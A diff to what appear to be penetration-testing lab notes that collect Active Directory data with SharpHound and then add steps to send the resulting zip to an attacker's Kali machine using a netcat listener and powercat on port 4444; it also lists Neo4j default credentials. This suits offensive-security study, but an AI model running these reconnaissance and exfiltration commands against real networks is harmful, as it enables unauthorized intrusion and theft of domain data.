@@ -9,6 +9,16 @@ Import-Module .\Sharphound.ps1
 ```powershell
 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "domain-audit"
 ```
+Get the file back to Kali with Powercat:
+```bash
+nc -nlvp 4444 > bloodhound.zip
+```
+```powershell
+Import-Module .\powercat.ps1
+```
+```powershell
+powercat -c 192.168.45.xx -p 4444 -i bloodhound.zip
+```
 The resulting ZIP can be analysed in Neo4J (default creds `neo4j:neo4j`):
 ```bash
 sudo neo4j start
